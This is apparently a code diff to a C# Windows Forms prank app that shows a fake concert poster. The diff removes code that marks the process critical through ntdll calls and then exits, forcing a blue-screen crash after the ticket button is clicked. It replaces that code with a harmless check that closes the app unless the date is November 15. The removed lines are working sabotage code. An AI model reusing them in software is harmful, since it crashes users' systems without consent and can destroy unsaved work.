@@ -1,8 +1,6 @@
 using System;
-using System.Diagnostics;
 using System.Drawing;
 using System.Reflection;
-using System.Runtime.InteropServices;
 using System.Windows.Forms;
 
 class PosterForm : Form
@@ -10,21 +8,15 @@ class PosterForm : Form
     Image posterImg;
     Image daddyImg;
     bool isDaddyMode = false;
-    System.Windows.Forms.Timer bsodTimer; // Таймер для задержки перед BSoD
-
-    // Импорт функций ntdll.dll для перевода процесса в критический статус
-    [DllImport("ntdll.dll")]
-    private static extern uint RtlAdjustPrivilege(int privilege, bool bEnablePrivilege, bool bCurrentThread, out bool prevValue);
-
-    [DllImport("ntdll.dll")]
-    private static extern uint NtSetInformationProcess(IntPtr processHandle, int processInformationClass, ref int processInformation, int processInformationLength);
 
     public PosterForm()
     {
-        // Загрузка ресурсов
+        // 1. Check conditions before loading the UI
+        CheckTicketConditions();
+
+        // 2. Load embedded resources
         using (var s = Assembly.GetExecutingAssembly().GetManifestResourceStream("poster.jpg"))
             posterImg = Image.FromStream(s);
-
         using (var s = Assembly.GetExecutingAssembly().GetManifestResourceStream("daddy.png"))
             daddyImg = Image.FromStream(s);
 
@@ -36,12 +28,30 @@ class PosterForm : Form
         DoubleBuffered = true;
         Cursor = Cursors.Hand;
 
-        // Инициализация таймера
-        bsodTimer = new System.Windows.Forms.Timer();
-        bsodTimer.Interval = 3000; // Задержка в миллисекундах (3 секунды)
-        bsodTimer.Tick += BsodTimer_Tick;
+        // 3. Determine initial visual layout based on settings and current date
+        DateTime today = DateTime.Today;
+        if (Properties.Settings.Default.HasBoughtTickets && today.Month == 11 && today.Day == 15)
+        {
+            SetupFullScreenDaddyLayout();
+        }
+        else
+        {
+            SetupPosterLayout();
+        }
+    }
 
-        SetupPosterLayout();
+    private void CheckTicketConditions()
+    {
+        // If the user already bought tickets but it's NOT November 15 yet, block access
+        if (Properties.Settings.Default.HasBoughtTickets)
+        {
+            DateTime today = DateTime.Today;
+            if (today.Month != 11 || today.Day != 15)
+            {
+                MessageBox.Show("Open in November 15.", "Information", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                Environment.Exit(0); // Safely close the app immediately
+            }
+        }
     }
 
     private void SetupPosterLayout()
@@ -65,7 +75,6 @@ class PosterForm : Form
     protected override void OnPaint(PaintEventArgs e)
     {
         e.Graphics.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
-
         if (isDaddyMode)
         {
             e.Graphics.DrawImage(daddyImg, 0, 0, ClientSize.Width, ClientSize.Height);
@@ -78,67 +87,46 @@ class PosterForm : Form
 
     protected override void OnMouseClick(MouseEventArgs e)
     {
-        if (isDaddyMode) return; // Игнорируем клики, если таймер смерти уже запущен
+        if (isDaddyMode) return;
 
         double fx = (double)e.X / ClientSize.Width;
         double fy = (double)e.Y / ClientSize.Height;
 
-        // Кнопка закрытия (крестик)
+        // Close button (X)
         if (fx > 0.93 && fy < 0.07)
         {
             Close();
             return;
         }
 
-        // Кнопка КУПИТЬ БИЛЕТЫ
+        // BUY TICKETS button
         if (fx > 0.17 && fx < 0.83 && fy > 0.92 && fy < 0.995)
         {
-            MessageBox.Show("Билеты закончились! Все раскупил Медведь 🐻 , Деревня Петухи", 
-                            "Информация", MessageBoxButtons.OK, MessageBoxIcon.Information);
+            MessageBox.Show("Билеты закончились! Все раскупил Медведь 🐻 , Деревня Петухи", "Информация", MessageBoxButtons.OK, MessageBoxIcon.Information);
 
-            // 1. Переключаемся на полный экран с daddy.png
-            SetupFullScreenDaddyLayout();
-            Invalidate(); // Принудительно перерисовываем интерфейс, чтобы картинка появилась
+            // Save transaction state to application configuration settings
+            Properties.Settings.Default.HasBoughtTickets = true;
+            Properties.Settings.Default.Save();
 
-            // 2. Запускаем таймер обратного отсчета до синего экрана
-            bsodTimer.Start();
+            // Evaluate state depending on what day they clicked it
+            DateTime today = DateTime.Today;
+            if (today.Month == 11 && today.Day == 15)
+            {
+                SetupFullScreenDaddyLayout();
+                Invalidate();
+            }
+            else
+            {
+                MessageBox.Show("Open in November 15.", "Information", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                Application.Exit();
+            }
         }
-
         base.OnMouseClick(e);
     }
 
-    private void BsodTimer_Tick(object sender, EventArgs e)
-    {
-        bsodTimer.Stop(); // Останавливаем таймер во избежание повторного вызова
-        TriggerBsod();
-    }
-
-    private void TriggerBsod()
-{
-    try
-    {
-        bool prevValue;
-        
-        RtlAdjustPrivilege(20, true, false, out prevValue);
-
-        int isCritical = 1;
-        IntPtr currentProcessHandle = Process.GetCurrentProcess().Handle;
-        NtSetInformationProcess(currentProcessHandle, 29, ref isCritical, sizeof(int));
-
-        Environment.Exit(0);
-    }
-    catch
-    {
-        // Если что-то пошло не так (например, запуск не от Администратора), просто закрываем приложение
-        Environment.Exit(1);
-    }
-}
-
-
     protected override void OnKeyDown(KeyEventArgs e)
     {
-        // Блокируем выход по Escape, если приложение перешло в режим Daddy (система уже приговорена)
-        if (e.KeyCode == Keys.Escape && !isDaddyMode)
+        if (e.KeyCode == Keys.Escape)
         {
             Close();
         }
@@ -149,6 +137,7 @@ class PosterForm : Form
     static void Main()
     {
         Application.EnableVisualStyles();
+        Application.SetCompatibleTextRenderingDefault(false);
         Application.Run(new PosterForm());
     }
 }
